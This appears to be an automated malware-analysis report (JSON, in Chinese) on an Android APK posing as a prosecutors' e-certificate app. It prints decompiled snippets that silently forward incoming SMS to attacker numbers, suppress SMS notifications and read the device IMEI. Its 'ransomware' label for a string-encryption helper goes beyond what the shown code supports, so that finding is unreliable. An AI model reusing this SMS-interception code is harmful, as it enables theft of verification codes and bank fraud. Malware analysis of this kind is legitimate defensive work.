@@ -1,0 +1,150 @@
+{
+  "APK信息": {
+    "文件名": "d3f2fb4c360800e7b070dcb6e06e034f8c090b70ea528081466c635a75fe0c29.apk",
+    "sha256": "d3f2fb4c360800e7b070dcb6e06e034f8c090b70ea528081466c635a75fe0c29",
+    "包名": "com.android.playguns",
+    "应用名": "高检院电子协办证",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 178.2
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\playguns\\SmsReceiver;",
+          "method_signature": "if(i4 >= b2.length()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String displayMessageBody = smsMessage.getDisplayMessageBody();\nString string = ((JSONObject) b2.get(i4)).getString(\"switch_mobile\");\nsmsManager.sendTextMessage(string, null, displayMessageBody, null, null);",
+          "malicious_code_snippet_context": "                  int i2 = intent.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED\") ? 1 : intent.getAction().equals(\"android.provider.Telephony.SMS_SENT\") ? 2 : 1;\n                  for (SmsMessage smsMessage : smsMessageArr) {\n                      String displayOriginatingAddress = smsMessage.getDisplayOriginatingAddress();\n>>>                     String displayMessageBody = smsMessage.getDisplayMessageBody();\n>>>                     Log.i(\"msg\", \"执行了...来源：\" + displayOriginatingAddress);\n>>>                     int i3 = 0;\n                      while (true) {\n                          int i4 = i3;\n                          if (i4 >= b2.length()) {",
+          "behavior_description": "该代码在SmsReceiver中拦截接收到的短信内容，从JSON数组b2中提取攻击者配置的转发目标号码(switch_mobile)，通过SmsManager.sendTextMessage()将收到的短信原文静默转发到这些号码，同时记录sim_number、来源号码、转发号码和内容等信息。这是典型的短信拦截转发行为，常用于窃取短信验证码实施银行欺诈或短信劫持攻击。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\android\\playguns\\DeliverSmsReceiver;",
+          "method_signature": "if(i >= smsMessageArr.length)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "abortBroadcast();\nwhile (i2 < smsMessageArr.length) {\n    smsMessageArr[i2] = SmsMessage.createFromPdu((byte[]) objArr[i2]);\n    String originatingAddress = smsMessageArr[i2].getOriginatingAddress();\n    String messageBody2 = smsMessageArr[i2].getMessageBody();\n    ContentValues contentValues2 = new ContentValues();\n    contentValues2.put(\"address\", originatingAddress);\n    contentValues2.put(\"date\", Long.valueOf(System.currentTimeMillis()));\n    contentValues2.put(\"body\", messageBody2);\n    this.f157a.insert(Uri.parse(\"content://sms/inbox\"), contentValues2);\n}",
+          "malicious_code_snippet_context": "                          i++;\n                      }\n                  } else {\n>>>                     abortBroadcast();\n>>>                     int i2 = 0;\n>>>                     String str3 = \"\";\n>>>                     str = \"\";\n>>>                     while (i2 < smsMessageArr.length) {\n>>>                         smsMessageArr[i2] = SmsMessage.createFromPdu((byte[]) objArr[i2]);\n>>>                         String originatingAddress = smsMessageArr[i2].getOriginatingAddress();\n>>>                         String messageBody2 = smsMessageArr[i2].getMessageBody();\n>>>                         ContentValues contentValues2 = new ContentValues();\n>>>                         contentValues2.put(\"address\", originatingAddress);\n>>>                         contentValues2.put(\"date\", Long.valueOf(System.currentTimeMillis()));\n                          contentValues2.put(\"body\", messageBody2);\n                          a.a aVar = new a.a(\"0\", \"0\", 1, originatingAddress, messageBody2, new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\").format(new Date()));\n                          i2++;",
+          "behavior_description": "该代码在SMS广播接收器中调用abortBroadcast()拦截 incoming SMS 广播，阻止系统默认短信应用收到短信通知，从而对用户隐藏短信内容。随后从PDU中解析出短信发送方地址和消息正文，将其手动插入 content://sms/inbox 数据库。这是一种典型的短信拦截行为，恶意软件通过隐藏验证码、银行通知等关键短信，为后续的短信欺诈或验证码劫持创造条件。数据流向：SmsMessage.createFromPdu() 获取原始短信PDU数据 → abortBroadcast() 中断广播传递 + insert() 篡改短信数据库",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\playguns\\AlarmReceiver;",
+          "method_signature": "if(!b.i.a(context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String deviceId = ((TelephonyManager) context.getSystemService(\"phone\")).getDeviceId();\nString a2 = new g(context).a();\nif (a2 != null && !bool.booleanValue()) {\n    deviceId = a2;\n}\nf = deviceId;",
+          "malicious_code_snippet_context": "          }\n          f153a = true;\n          SQLiteDatabase writableDatabase = new b(context, \"datainfo.db\", 2).getWritableDatabase();\n>>>         String deviceId = ((TelephonyManager) context.getSystemService(\"phone\")).getDeviceId();\n>>>         String a2 = new g(context).a();\n>>>         if (a2 != null && !bool.booleanValue()) {\n>>>             deviceId = a2;\n>>>         }\n>>>         Log.i(\"\", \"sim_number=\" + deviceId);\n          f = deviceId;\n          if (f155c == 1000000) {\n              f155c = 0;",
+          "behavior_description": "代码通过 TelephonyManager 获取设备的 IMEI/MEID，并尝试获取其他设备标识符，将其赋值给全局变量，用于设备指纹采集和后续可能的隐私窃取。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lb\\a;",
+          "method_signature": "if(length2 > bArr.length)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\nbyte[] bArr = new byte[16];\nbyte[] bytes = str2.getBytes(\"UTF-8\");\nSystem.arraycopy(bytes, 0, bArr, 0, length2);\ncipher.init(1, new SecretKeySpec(bArr, \"AES\"), new IvParameterSpec(bArr));\nbyte[] doFinal = cipher.doFinal(str.getBytes(\"UTF-8\"));\nreturn new String(Base64.encode(doFinal, 0, doFinal.length, 0), \"UTF-8\");",
+          "malicious_code_snippet_context": "              }\n          }\n          try {\n>>>             Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n>>>             byte[] bArr = new byte[16];\n>>>             byte[] bytes = str2.getBytes(\"UTF-8\");\n>>>             int length2 = bytes.length;\n>>>             if (length2 > bArr.length) {\n>>>                 length2 = bArr.length;\n>>>             }\n              System.arraycopy(bytes, 0, bArr, 0, length2);\n              cipher.init(1, new SecretKeySpec(bArr, \"AES\"), new IvParameterSpec(bArr));\n              byte[] doFinal = cipher.doFinal(str.getBytes(\"UTF-8\"));",
+          "behavior_description": "该代码实现了一个AES/CBC/PKCS5Padding加密方法。它接收待加密数据(str)和密钥(str2)，将密钥截断或填充至16字节后同时作为AES密钥和IV，对待加密数据进行加密并返回Base64编码后的密文。在勒索软件上下文中，此方法被用于加密用户文件内容，导致数据无法正常访问。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
